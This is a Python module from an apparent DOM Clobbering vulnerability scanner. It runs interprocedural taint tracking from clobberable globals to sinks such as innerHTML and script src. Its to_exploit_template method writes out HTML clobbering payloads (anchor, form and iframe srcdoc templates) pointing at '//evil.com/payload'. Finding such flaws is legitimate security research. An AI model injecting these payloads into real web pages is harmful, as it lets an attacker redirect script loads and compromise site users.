"""Worklist-based interprocedural taint propagation for DOM Clobbering.

Propagates taint from clobberable sources through the PDG to dangerous sinks.
Uses 1-CFA (one call-site context level) for balance of precision vs. cost.
"""
from __future__ import annotations

import logging
from collections import deque
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from .js_ast_parser import ClobberSource, ClobberSink, Guard, Location
from .js_pdg_builder import EdgeKind, NodeKind, PDGEdge, PDGNodeId, PropertyDependencyGraph

if TYPE_CHECKING:
    pass

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class TaintState:
    sources: frozenset[PDGNodeId]
    depth: int
    guards: tuple[Guard, ...]
    coercion: bool


@dataclass
class FlowStep:
    node_id: PDGNodeId
    node_name: str
    edge_kind: str
    location: Location

    def to_dict(self) -> dict:
        return {
            "name": self.node_name,
            "edge": self.edge_kind,
            "file_id": self.location.file_id,
            "line": self.location.line,
            "col": self.location.col,
        }


@dataclass
class Gadget:
    source: ClobberSource
    sink: ClobberSink
    path: list[FlowStep]
    chain_depth_required: int
    coercion_needed: bool
    guards: list[Guard]
    framework_pattern: str | None
    score: float = 0.0

    def to_exploit_template(self) -> str:
        """Generate HTML payload for this gadget."""
        prop = self.source.property_name
        depth = self.chain_depth_required

        if depth <= 1:
            if self.coercion_needed:
                return f'<a id="{prop}" href="//evil.com/payload"></a>'
            return f'<div id="{prop}">clobbered</div>'
        elif depth == 2:
            chain = self.source.access_chain
            parent = chain[0] if len(chain) > 0 else prop
            child = chain[1] if len(chain) > 1 else "value"
            if self.coercion_needed:
                return (f'<a id="{parent}"></a>'
                        f'<a id="{parent}" name="{child}" href="//evil.com/payload"></a>')
            return (f'<form id="{parent}">'
                    f'<input name="{child}" value="clobbered">'
                    f'</form>')
        else:
            parent = self.source.access_chain[0] if self.source.access_chain else prop
            child = self.source.access_chain[1] if len(self.source.access_chain) > 1 else "y"
            return (f'<iframe name="{parent}" '
                    f'srcdoc=\'<a id="{child}" href="//evil.com/payload">\'></iframe>')

    def to_dict(self) -> dict:
        return {
            "source": {
                "property": self.source.property_name,
                "access": self.source.access_pattern,
                "priority": self.source.priority,
                "line": self.source.location.line,
                "file_id": self.source.location.file_id,
            },
            "sink": {
                "type": self.sink.sink_type,
                "severity": self.sink.severity,
                "line": self.sink.location.line,
                "file_id": self.sink.location.file_id,
            },
            "path": [step.to_dict() for step in self.path],
            "chain_depth": self.chain_depth_required,
            "coercion_needed": self.coercion_needed,
            "guards": [{"kind": g.kind, "name": g.checked_name, "line": g.location.line} for g in self.guards],
            "framework_pattern": self.framework_pattern,
            "score": round(self.score, 1),
            "exploit_template": self.to_exploit_template(),
        }


class TaintTracker:
    MAX_PROPAGATION_DEPTH = 20
    MAX_WORKLIST_SIZE = 500_000

    def __init__(
        self,
        pdg: PropertyDependencyGraph,
        sources: list[ClobberSource],
        sinks: list[ClobberSink],
        source_node_ids: dict[str, PDGNodeId] | None = None,
        sink_node_ids: dict[str, PDGNodeId] | None = None,
    ):
        self.pdg = pdg
        self.sources = sources
        self.sinks = sinks
        self.taint_map: dict[PDGNodeId, TaintState] = {}
        self.gadgets: list[Gadget] = []
        self._worklist: deque[tuple[PDGNodeId, TaintState, int, list[FlowStep]]] = deque()

        # Map source property names -> PDGNodeIds
        self._source_nodes: dict[PDGNodeId, ClobberSource] = {}
        if source_node_ids:
            for src in sources:
                if src.property_name in source_node_ids:
                    self._source_nodes[source_node_ids[src.property_name]] = src

        # Map sink locations -> ClobberSinks
        self._sink_nodes: set[PDGNodeId] = set()
        self._sink_by_node: dict[PDGNodeId, ClobberSink] = {}
        if sink_node_ids:
            for sink in sinks:
                if sink.sink_type in sink_node_ids:
                    nid = sink_node_ids[sink.sink_type]
                    self._sink_nodes.add(nid)
                    self._sink_by_node[nid] = sink

    def propagate(self) -> list[Gadget]:
        """Run worklist-based forward taint propagation."""
        # Seed worklist with source nodes
        for nid, src in self._source_nodes.items():
            initial = TaintState(
                sources=frozenset({nid}),
                depth=src.chain_depth,
                guards=(),
                coercion=False,
            )
            step = FlowStep(nid, src.property_name, "source", src.location)
            self._worklist.append((nid, initial, 0, [step]))

        # Also seed from all GLOBAL_ACCESS nodes in PDG that match source names
        source_names = {s.property_name for s in self.sources}
        for node in self.pdg.nodes.values():
            if node.kind == NodeKind.GLOBAL_ACCESS and node.is_undeclared:
                name = node.id.name
                if name in source_names:
                    src = next((s for s in self.sources if s.property_name == name), None)
                    if src and node.id not in self._source_nodes:
                        self._source_nodes[node.id] = src
                        initial = TaintState(
                            sources=frozenset({node.id}),
                            depth=src.chain_depth,
                            guards=(),
                            coercion=False,
                        )
                        step = FlowStep(node.id, name, "source", src.location)
                        self._worklist.append((node.id, initial, 0, [step]))

        visited: dict[PDGNodeId, TaintState] = {}

        while self._worklist:
            if len(self._worklist) > self.MAX_WORKLIST_SIZE:
                self._trim_worklist()

            node_id, taint, depth, path = self._worklist.popleft()

            if depth > self.MAX_PROPAGATION_DEPTH:
                continue

            existing = visited.get(node_id)
            if existing and not self._wider_than(taint, existing):
                continue

            visited[node_id] = self._merge_taint(existing, taint) if existing else taint
            self.taint_map[node_id] = visited[node_id]

            # Check if this node is a sink
            self._check_sink(node_id, visited[node_id], path)

            # Propagate forward
            for edge in self.pdg.successors(node_id):
                new_taint = self._apply_edge(edge, visited[node_id])
                if new_taint is not None:
                    dst_name = edge.dst.name
                    new_step = FlowStep(edge.dst, dst_name, edge.kind.name,
                                        Location(edge.dst.file_id, edge.line, edge.col))
                    self._worklist.append((edge.dst, new_taint, depth + 1, path + [new_step]))

        return self.gadgets

    def _apply_edge(self, edge: PDGEdge, taint: TaintState) -> TaintState | None:
        match edge.kind:
            case EdgeKind.ASSIGN | EdgeKind.SPREAD | EdgeKind.TEMPLATE | EdgeKind.DESTRUCTURE:
                return taint
            case EdgeKind.PROP_READ | EdgeKind.OPTIONAL_CHAIN:
                guards = taint.guards
                if edge.kind == EdgeKind.OPTIONAL_CHAIN:
                    guards = guards + (Guard("optional_chain", edge.dst.name,
                                             Location(edge.dst.file_id, edge.line, edge.col)),)
                return TaintState(taint.sources, taint.depth + 1, guards, taint.coercion)
            case EdgeKind.CONCAT:
                return TaintState(taint.sources, taint.depth, taint.guards, coercion=True)
            case EdgeKind.OR_DEFAULT:
                guard = Guard("or_default", edge.src.name,
                              Location(edge.src.file_id, edge.line, edge.col))
                return TaintState(taint.sources, taint.depth, taint.guards + (guard,), taint.coercion)
            case EdgeKind.NULLISH:
                guard = Guard("nullish_coalescing", edge.src.name,
                              Location(edge.src.file_id, edge.line, edge.col))
                return TaintState(taint.sources, taint.depth, taint.guards + (guard,), taint.coercion)
            case EdgeKind.ARG_PASS | EdgeKind.RETURN_FLOW | EdgeKind.CALLBACK_ITEM:
                return taint
            case EdgeKind.COMPUTED_READ:
                return taint
            case EdgeKind.PROP_WRITE:
                return None  # Writing tainted value TO a property, not reading from it
            case _:
                return taint

    def _check_sink(self, node_id: PDGNodeId, taint: TaintState, path: list[FlowStep]):
        """Check if node_id is a sink, and if so record a Gadget."""
        # Check explicit sink nodes
        if node_id in self._sink_nodes:
            sink = self._sink_by_node[node_id]
            self._record_gadget(taint, sink, path)
            return

        # Also check by node name pattern (for sinks not explicitly mapped)
        node = self.pdg.nodes.get(node_id)
        if not node:
            return

        name = node_id.name.lower()
        if node.kind == NodeKind.PROPERTY_ACCESS:
            chain = node.access_chain
            if chain and chain[-1] in ('innerHTML', 'outerHTML'):
                sink = ClobberSink('innerHTML', Location(node_id.file_id, node_id.line, node_id.col),
                                   'CRITICAL', node_id.scope_id)
                self._record_gadget(taint, sink, path)
            elif chain and chain[-1] in ('src',) and len(chain) >= 2:
                # Check if parent is script/iframe
                sink = ClobberSink('src_assignment', Location(node_id.file_id, node_id.line, node_id.col),
                                   'HIGH', node_id.scope_id)
                self._record_gadget(taint, sink, path)

    def _record_gadget(self, taint: TaintState, sink: ClobberSink, path: list[FlowStep]):
        """Create a Gadget from a taint state reaching a sink."""
        from .js_framework_patterns import match_property

        for src_nid in taint.sources:
            src = self._source_nodes.get(src_nid)
            if not src:
                continue

            # Check for framework pattern match
            patterns = match_property(src.property_name)
            framework = patterns[0].name if patterns else None

            gadget = Gadget(
                source=src,
                sink=sink,
                path=list(path),
                chain_depth_required=taint.depth,
                coercion_needed=taint.coercion,
                guards=list(taint.guards),
                framework_pattern=framework,
            )
            self.gadgets.append(gadget)

    def _wider_than(self, new: TaintState, old: TaintState) -> bool:
        return not new.sources.issubset(old.sources) or new.depth > old.depth

    def _merge_taint(self, a: TaintState, b: TaintState) -> TaintState:
        return TaintState(
            sources=a.sources | b.sources,
            depth=max(a.depth, b.depth),
            guards=a.guards if len(a.guards) <= len(b.guards) else b.guards,
            coercion=a.coercion or b.coercion,
        )

    def _trim_worklist(self):
        items = list(self._worklist)
        items.sort(key=lambda x: x[2])
        self._worklist = deque(items[:len(items) // 2])
        logger.warning("Worklist trimmed from %d to %d entries", len(items), len(self._worklist))
